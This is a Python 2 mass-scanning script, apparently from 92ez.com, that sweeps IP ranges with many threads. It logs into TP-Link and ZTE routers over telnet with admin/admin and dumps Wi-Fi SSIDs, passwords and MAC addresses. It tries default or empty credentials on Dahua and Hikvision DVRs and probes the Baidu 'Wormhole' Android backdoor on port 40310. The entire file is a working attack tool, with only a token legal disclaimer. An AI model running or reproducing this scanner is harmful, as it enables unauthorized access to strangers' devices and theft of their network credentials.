#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com
# last modify time 2016-02-19
# python dvrlogin.py 1.1.1.1-1.1.2.1 200


import threading
import telnetlib
import requests
import Queue
import time
import json
import sys
import re

#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)

#get list
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#main function
def bThread(iplist):
    
    threadl = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[2])):
        threadl.append(tThread(queue))
        
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()        

#create thread
class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        
        while not self.queue.empty(): 
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue

def getinfo(host):

    ports = [80,81,82,83,84,85,86,87,88,89,90]

    checkTplink(host)
    check9806H(host)
    checkWormhole(host)
    
    for k in ports:
        checkDahuaDVR(host,str(k))
        checkHKDVR(host,str(k))

def checkTplink(host):

    telnetTime = 5
    cmdTime = 3

    try:
        t = telnetlib.Telnet(host, timeout = telnetTime)
        #login
        t.read_until("username:", cmdTime)
        t.write("admin\n")
        t.read_until("password:", cmdTime)
        t.write("admin\n")

        #start exec cmd to get wifi info
        t.write("wlctl show\n")
        t.read_until("SSID", cmdTime)
        wifiStr = t.read_very_eager()

        #start exec cmd to get macaddree info
        t.write("lan show info\n")
        t.read_until("MACAddress", cmdTime)
        lanStr = t.read_very_eager()

        #close connection
        t.close()

        if len(wifiStr) > 0:
            
            #clear extra space
            wifiStr = "".join(wifiStr.split())
            #get SID KEY MAC
            SID = wifiStr[1:wifiStr.find('QSS')].encode('utf8')
            KEY = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')].encode('utf8') if wifiStr.find('Key=') != -1 else '无密码'
            MAC = lanStr[1:lanStr.find('__')].encode('utf8').replace('\n','')

            print  'Found [Router] [TPLINK] Host : '+ host +':23 Info : '+ SID +' '+ KEY +' '+ MAC
    except:
        pass

def checkDahuaDVR(host,port):
    aimurl = 'http://'+ host +':'+ port +'/RPC2_Login'
    data1 = '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0"},"id":10000}'
    try:
        req = requests.post(url = aimurl,data = data1,timeout = 5)
        sessionJSON = json.loads(req.text)

        if len(str(sessionJSON['session'])) > 0:
            print  'Found [DVR] [Dahua] Host : http://'+ host +':'+ port + " Info : session: " + str(sessionJSON['session'])

    except:
        pass

def checkHKDVR(host,port):
    aimurl = 'http://admin:12345@'+ host +':'+ port
    try:
        req = requests.get(url= aimurl +'/ISAPI/Security/userCheck',timeout = 5)
        result = req.text
        status = re.findall(r'<statusValue>(.*)</statusValue>', result)

        if status[0] == '200':
            print 'Found [DVR] [Hikvision] Host : http://'+ host +':'+ port +' Info : Login Success!'
        else:
            print 'Found [DVR] [Hikvision] Host : http://'+ host +':'+ port +' Info : Login Failed!'
    except:
        pass

def check9806H(host):

    try:
        t = telnetlib.Telnet(host, timeout = 5)
        t.read_until("9806", 5)
        firstStr = t.read_very_eager()

        if len(firstStr) > 0:
            t.write("\n")
            t.read_until("Login:", 5)
            t.write("admin\r\n")
            t.read_until("Password:", 5)
            t.write("admin\r\n")
            t.read_until("\n", 5)
            time.sleep(5)

            loginStr = t.read_very_eager()
            resultStr = loginStr.split('>')

            if len(resultStr) > 1:
                print  'Found [Router] [ZTE 9806H] Host : '+ host +':23 Info : '+ resultStr[0].replace('\r\n','')
            else:
                print  'Found [Router] [ZTE 9806H] Host : '+ host +':23 Info : Login Failed.'
        else:
            t.close()

    except Exception,e:
        pass

def checkWormhole(host):

    aimurl = "http://%s:40310/getserviceinfo?mcmdf=inapp_baidu_bdgjs&callback=jsonp" % (host)
    headers = {"Accept": "*/*","Host": "127.0.0.1","remote-addr": "127.0.0.1","Referer": "http://www.baidu.com/"}

    try:
        request = requests.get(url = aimurl,headers = headers,timeout=5)
        response = request.content

        print  'Found [Android] [Wormhole] Host : '+ host +':40310 Info : '+response

    except Exception,e:
        return 

if __name__ == '__main__':
    print 'Just make a test in the extent permitted by law  (^_^)'

    startIp = sys.argv[1].split('-')[0]
    endIp = sys.argv[1].split('-')[1]
    iplist = ip_range(startIp, endIp)

    global TOTALIP
    TOTALIP = len(iplist)
    print '\n[Note] Total '+str(TOTALIP)+" IP...\n"
    print '[Note] Running...\n'

    bThread(iplist)
